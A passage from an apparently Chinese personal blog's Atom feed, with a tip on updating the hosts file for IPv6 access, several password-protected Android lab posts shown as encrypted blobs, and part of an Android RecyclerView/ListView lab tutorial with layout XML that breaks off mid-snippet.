    
      <category term="IntelliJ IDEA" scheme="http://www.danboard.me/categories/IntelliJ-IDEA/"/>
    
    
      <category term="plugin" scheme="http://www.danboard.me/tags/plugin/"/>
    
  </entry>
  
  <entry>
    <title>ipv6_host</title>
    <link href="http://www.danboard.me/ipv6-host/"/>
    <id>http://www.danboard.me/ipv6-host/</id>
    <published>2018-07-29T09:20:05.000Z</published>
    <updated>2018-09-29T14:19:40.111Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://user-images.githubusercontent.com/32091554/43365248-687326c4-935c-11e8-92da-eb655633c6d0.png" alt="image"></p><a id="more"></a><h2 id="ipv6"><a class="header-anchor" href="#ipv6" aria-hidden="true">¶</a> ipv6</h2><blockquote><p>IPv6是Internet Protocol Version 6的缩写。IPv6是IETF（互联网工程任务组，Internet Engineering Task Force）设计的用于替代现行版本IP协议（IPv4）的下一代IP协议，号称可以为全世界的每一粒沙子编上一个网址。</p><p>由于IPv4（32位）最大的问题在于网络地址资源有限，严重制约了互联网的应用和发展。IPv6（128位）的使用，不仅能解决网络地址资源数量的问题，而且也解决了多种接入设备连入互联网的障碍 。—— 百度百科</p></blockquote><h2 id="Hosts"><a class="header-anchor" href="#Hosts" aria-hidden="true">¶</a> Hosts</h2><blockquote><p><strong>Hosts</strong>是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 —— 百度百科</p></blockquote><ul><li><p>位置</p><p>Windows ：<code>%SystemRoot\System32\Drivers\etc%</code>（<code>%SystemRoot%</code>一般是 <code>C:\Windows</code>）</p><p>Linux（Mac、Android）：<code>/etc</code></p></li></ul><h2 id="准备"><a class="header-anchor" href="#准备" aria-hidden="true">¶</a> 准备</h2><ul><li>支持ipv6的网络（国内高校一般都有）</li><li>最新的（具有ipv6地址与域名映射关系）hosts文件</li></ul><h2 id="测试"><a class="header-anchor" href="#测试" aria-hidden="true">¶</a> 测试</h2><p>检查你的网络是否支持ipv6，<a href="http://test-ipv6.com" target="_blank" rel="noopener">test</a></p><h2 id="步骤"><a class="header-anchor" href="#步骤" aria-hidden="true">¶</a> 步骤</h2><ul><li><p>更新host文件</p><ul><li><p>百度最新hosts文件，例如：<a href="https://laod.cn/hosts/2018-google-hosts.html" target="_blank" rel="noopener">老D博客</a></p></li><li><p><a href="https://github.com/lennylxx/ipv6-hosts" target="_blank" rel="noopener">Github地址</a>，这里提供自动更新hosts文件的脚本</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> update_hosts.py</span><br><span class="line">usage: update_hosts [OPTIONS] FILE</span><br><span class="line">A simple multi-threading tool used for updating hosts file.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help             show this help message and exit</span><br><span class="line">  -s DNS                 set another dns server, default: 2001:4860:4860::8844</span><br><span class="line">  -o OUT_FILE            output file, default: inputfilename.out</span><br><span class="line">  -t QUERY_TYPE          dig command query type, default: aaaa</span><br><span class="line">  -c, --cname            write canonical name into hosts file</span><br><span class="line">  -n THREAD_NUM          set the number of worker threads, default: 10</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span> merge_snippets.sh (shell下执行)</span><br><span class="line">usage: ./merge_snippets.sh new_hosts</span><br></pre></td></tr></table></figure></li><li><p>刷新DNS缓存</p><ul><li><p>Windows</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> cmd</span><br><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure></li></ul></li></ul><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/32091554/43365248-687326c4-935c-11e8-92da-eb655633c6d0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="小技巧" scheme="http://www.danboard.me/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="tips" scheme="http://www.danboard.me/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>【Android】Lab10_传感器应用及位置服务</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab10-%E4%BC%A0%E6%84%9F%E5%99%A8%E5%BA%94%E7%94%A8%E5%8F%8A%E4%BD%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.danboard.me/【Android】Lab10-传感器应用及位置服务/</id>
    <published>2018-05-12T14:54:24.000Z</published>
    <updated>2018-05-12T14:54:24.229Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+59ynEkGETK+PVW/1FuUuy2aPK4gFJfa9pTaMKtxzBdgIi5lQk8HjU2mEvo7lGLTYPVKck8+v0jJe+qH3PjAEnH/OJTTikwjT/L8EqFsibAlL4tqg6/TscWnFIr/ThBsHZ/sXL7ExAgm9LiPSVpGaNp2DV/dlt9mqNKA7mjBsm3TkpwWCK53XQ6oIrXktebbsn/I8O45xbFcgdYe6aEDdlOo/l48z49hc= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab9_实现网络请求</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab9-%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/"/>
    <id>http://www.danboard.me/【Android】Lab9-实现网络请求/</id>
    <published>2018-05-12T14:53:32.000Z</published>
    <updated>2018-05-12T14:53:32.403Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19t1qEMMm+IEm9M4zVVdT9xjD9emKxugk7Tb49hQXKm4NRWmQdykitkIW8u4yz8k6Q2UF88F0mvyBgmN8/fNaNKs67nEna+t+aScRVmoOdaBgE7fuejDrDX8xasmN0WDtXDO3fKcf3BVfVmEPydOtdjxYjvYrk4TOgq8tNULtSAyY+OZip7KvqsoUf6N6sXOtWjh944pmFwm6jNotb4cMuGX0C4mGslVmk= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab8_数据存储（二）</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab8-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://www.danboard.me/【Android】Lab8-数据存储（二）/</id>
    <published>2018-05-12T14:52:29.000Z</published>
    <updated>2018-05-12T14:52:29.972Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1/T6ys7p/3+vcaEYhrxx5NZXqSDIzoCdSTHAaHMAIwMzJTNIlJZryZIkxgW5BapUEQ+ByZQ9h2u3JFSuJh2AZlYxCi4YYp8R1nin/YVK2vsxSLHQ+x+JmRXs3PVLgLlQa7P2d/8yK5oU9gtpx6akeSX1oQQ3nQQQ8M8KO/C/NH3+qlTzscJxNNA2v9yQtZsJevIUGZqV++xHYT0aapf6Ued0/aW3A2EReU= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab7_数据存储（一）</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab7-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://www.danboard.me/【Android】Lab7-数据存储（一）/</id>
    <published>2018-05-12T14:51:52.000Z</published>
    <updated>2018-05-12T14:51:52.135Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19b/OgjPQSqZoZ+2kkEp820jgb7YXtbhMyCpLVxgKFJJvgIHXjcdKsPUO9Y5Mg1ieCrBHBAPlYEdUWwomK3fFrghQvBv/YMV7ALccf1bSeSlHkkx93GYF1cY0gTYpmPAjpK/pgtBMuOaUYLGeIgCUxmzBhXLyRQwVeiHdlVdHa/JdtyWhL1Y3OOfhiFLFaAcYDCqNvEL6OxxRce0WIrj7VxwBPyku0ESC8= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab6_服务与多线程——简单音乐播放器</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab6-%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/"/>
    <id>http://www.danboard.me/【Android】Lab6-服务与多线程——简单音乐播放器/</id>
    <published>2018-05-12T14:51:07.000Z</published>
    <updated>2018-05-12T14:51:07.479Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX18rplajrLbT+1NYL5JtVe1xrqWzBE+XL4L/2JXJ3e7jSv3blXmsHyrB8KDv5Uow99V/HHC2dy3QZQ+c5guVGUrIvFUsZieKhtFVsuKdbtUEc2Q+RtLenWWZTvGP49CamJcwSKpomKBE7LtihFdzttGTWU374g3Ic0t/yeFBVd87SW2DMa8IUDBSE8ZNrFVxUTAOMo6tjDiul0w/KfGtPCrpauhavlzXCqc= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab5_Appwidget及Broadcast使用</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab5-Appwidget%E5%8F%8ABroadcast%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.danboard.me/【Android】Lab5-Appwidget及Broadcast使用/</id>
    <published>2018-05-12T14:49:55.000Z</published>
    <updated>2018-05-12T14:49:55.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX18vk7KFbGE7rpzlJkk/B9V5WUzwQ/qD9BhaLgf6cv0YYDCN0j+tasbOfNPJJ26A8azklc3MESdb4/CUxqvi98tHzIfgJTQeeea2qTaOWkAiGnpqIlLYCq8p5U59Zk7ZBV0Er38k6YWg/2X4z1KvqWYYW2XOPSw1GfegMA23Xm6OyHh+r7WXGni/7tNwhNwxUpxU8CkXqDYu4Kce1QPm/Gz2uiOXm4Tn/HA= </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab4_Broadcast使用</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab4-Broadcast%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.danboard.me/【Android】Lab4-Broadcast使用/</id>
    <published>2018-05-12T14:49:07.000Z</published>
    <updated>2018-05-13T17:15:37.945Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><link href="/display.css" rel="stylesheet" type="text/css"><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" The content is unfinished ! " /> <label for="pass"> The content is unfinished ! </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-7/84289596.jpg&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【Android】Lab3_Intent、Bundle的使用以及RecyclerView、ListView的应用</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab3-Intent%E3%80%81Bundle%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8ARecyclerView%E3%80%81ListView%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://www.danboard.me/【Android】Lab3-Intent、Bundle的使用以及RecyclerView、ListView的应用/</id>
    <published>2018-05-12T14:48:06.000Z</published>
    <updated>2018-09-29T14:18:28.064Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一 实验目的"><a class="header-anchor" href="#一 实验目的" aria-hidden="true">¶</a> 一 实验目的</h2><ol><li>复习事件处理</li><li>学习Intent、bundle在Activity跳转中的应用</li><li>学习Recyleview、ListView以及各类适配器的用法</li></ol><h2 id="二 实现内容"><a class="header-anchor" href="#二 实现内容" aria-hidden="true">¶</a> 二 实现内容</h2><p>1、商品表界面</p><p>每一项为一个圆圈和一个名字，圆圈与名字均竖直居中。圆圈中为字母的首字母，首字母要出于圆圈的中心，首字母为白色，名字为黑色，圆圈的颜色自定义。</p><p>2、购物列表界面</p><p>在商品表界面的基础上增加一个价格，价格为黑色</p><p>3、商品详情界面顶部</p><p>顶部占整个界面的1/3，图片与这块view等高。返回图标出于这块view的左上角，商品名字出于左下角，星标处于右下角，它们与边距有一定距离。返回图标与名字左对齐，名字与星标底边对齐。</p><p>4、商品详情界面中部</p><p>使用的黑色 argb 编码值为#D5000000，稍微偏灰色一点的“类型”、“其他信息”的 argb 编码值为#8A000000。价格那一栏的下边有一条分割线，argb 编码值为 #1E000000，右边购物车符号的左边也有一条分割线，argb 编码值也是#1E000000，这条分割线要求高度与购物车符号的高度一致，并且竖直居中。字体的大小看着调就可以了。“更多资料”底部的分割线高度自定，argb 编码值与前面的分割线一致。</p><p>5、商品详情界面底部</p><p>6、两个都没有标题栏</p><h2 id="三、课堂实验结果"><a class="header-anchor" href="#三、课堂实验结果" aria-hidden="true">¶</a> 三、课堂实验结果</h2><h3 id="1 实验截图"><a class="header-anchor" href="#1 实验截图" aria-hidden="true">¶</a> 1 实验截图</h3><p>商品列表界面<br><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/29877879.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/29877879.jpg"></p><p>长按删除<br><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/66483297.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/66483297.jpg"></p><p>商品详情界面<br><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/71041587.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/71041587.jpg"></p><p>购物车列表<br><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/51282217.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/51282217.jpg"></p><p>购物车删除<br><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/41165292.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/41165292.jpg"></p><h3 id="2 实验步骤以及关键代码"><a class="header-anchor" href="#2 实验步骤以及关键代码" aria-hidden="true">¶</a> 2 实验步骤以及关键代码</h3><p>1、先去掉标题栏</p><p>在配置文件<code>AndroidMainifest.xml</code>中，可以看到Android Studio创建项目时默认的theme是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><p>打开文件<code>res/values/styles.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"AppTheme"</span> <span class="attr">parent</span>=<span class="string">"Theme.AppCompat.Light.NoActionBar"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        //去掉标题  属性parent  DarkActionBar改为NoActionBar</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、使用RecyclerView实现商品列表</p><blockquote><p>RecycleView 是Android 5.0推出的，support-v7包中提供的新组件，最低兼容到Android 3.0。</p></blockquote><p>2.1 添加依赖</p><p><code>build.gradle(Project:lab3)</code>，在新版Android Studio中可以不用，已经集成好了函数<code>google()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        jcenter()</span><br><span class="line">        maven &#123;</span><br><span class="line">            url <span class="string">"https://maven.google.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>build.gradle(Moudle:app)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile <span class="string">'com.android.support:recyclerview-v7:26.0.0-alpha1'</span></span><br></pre></td></tr></table></figure><p>2.2 xml布局</p><p>主活动MainActivity中有两个列表：商品列表和购物车列表，为了区分，设置商品列表id为goodslist，visibility为visible，即显示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">android.support.v7.widget.RecyclerView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/goodslist"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:visibility</span>=<span class="string">"visible"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>没有结束，RecyclerView只是一个列表容器，我们还需要定义每一项的信息和样式</p><p>新建一个layout文件，命名为item.xml，水平布局LinearLayout，包含两个TextView，分别为商品名以及其首个字母。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-15/75783061.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-15/75783061.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/letter"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"25sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_margin</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/white"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/circle"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:paddingTop</span>=<span class="string">"15dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:paddingBottom</span>=<span class="string">"15dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"goodsName"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"20sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/black"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义首个字母样式，在drawable文件夹中新建一个xml文件，自定义样式</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-15/52131757.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-15/52131757.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">shape</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--大小--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">size</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:height</span>=<span class="string">"50dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:width</span>=<span class="string">"50dp"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--弧度--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">corners</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:radius</span>=<span class="string">"25dp"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--颜色--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">solid</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:color</span>=<span class="string">"@color/colorPrimary"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.3 逻辑实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、ListView创建空列表，id为shoppinglist即表示购物车列表， 在java文件中用适配器Adapter填充数据，数据包含商品名称<code>name</code>，商品价格<code>price</code>以及名称首字母<code>letter</code>。设置监听器，实现长按和单击不同的功能。</p><p>.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ListView</span></span></span><br><span 